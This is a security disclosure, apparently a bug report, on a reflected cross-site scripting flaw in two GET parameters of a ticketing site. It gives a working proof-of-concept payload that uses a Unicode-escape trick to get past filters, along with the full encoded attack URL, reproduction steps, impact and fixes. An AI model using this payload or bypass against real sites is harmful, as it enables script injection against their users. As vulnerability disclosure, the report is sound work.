## Title
Reflected XSS - tickets.pwnedbox.site

## Description
The `fname` and `lname` GET parameters on `tickets.pwnedbox.site` were found vulnerable to Reflected Cross-Site Scripting (XSS). A crafted JavaScript payload using the Unicode escape sequence `\u0070` was used to trigger a `prompt(1)` dialog in the browser.

## Steps to Reproduce

1. Open the target website:
   ```text
   https://tickets.pwnedbox.site/
   ```

2. Open the following crafted URL in a browser:
   ```text
   https://tickets.pwnedbox.site/?fname=hakama%27%22%3C%3E%3CsCRipt%3E%5Cu0070rompt%281%29%3C%2FsCRipt%3E&lname=hakama%27%22%3C%3E%3CsCRipt%3E%5Cu0070rompt%281%29%3C%2FsCRipt%3E
   ```

3. Allow the page to load.

4. Observe the JavaScript prompt dialog displaying `1`, confirming successful JavaScript execution.

5. Dismiss the prompt dialog.

## POC (Proof of Concept)

**Target URL:**  
https://tickets.pwnedbox.site/

**HTTP Method:** GET

**Vulnerable Parameters:** `fname`, `lname`

**Payload:**
```html
hakama'"<><sCRipt>\u0070rompt(1)</sCRipt>
```

**Crafted Request URL:**
```text
https://tickets.pwnedbox.site/?fname=hakama%27%22%3C%3E%3CsCRipt%3E%5Cu0070rompt%281%29%3C%2FsCRipt%3E&lname=hakama%27%22%3C%3E%3CsCRipt%3E%5Cu0070rompt%281%29%3C%2FsCRipt%3E
```

**Observed Result:**

The supplied JavaScript payload was executed through the `fname` and `lname` parameters, displaying a prompt dialog containing `1` and demonstrating Reflected Cross-Site Scripting (XSS).

**Screenshot:**

<img width="1920" height="1200" alt="image" src="https://github.com/user-attachments/assets/d7e149e0-7ab6-4c98-b7d1-644bcdb2d4dc" />

<img width="1920" height="1200" alt="image" src="https://github.com/user-attachments/assets/5e48cade-cb8b-4065-9e66-e65de1f2dfbd" />

## Impact

- An attacker can craft a malicious URL and trick victims into opening it.
- Successful exploitation allows JavaScript execution in the victim's browser.
- The vulnerability may be abused for phishing or manipulation of displayed webpage content.

## Remediation

- Apply context-aware output encoding to user-controlled input before rendering it in HTML.
- Validate and sanitize input received through the `fname` and `lname` parameters.
- Implement a restrictive Content Security Policy (CSP) as an additional security measure.
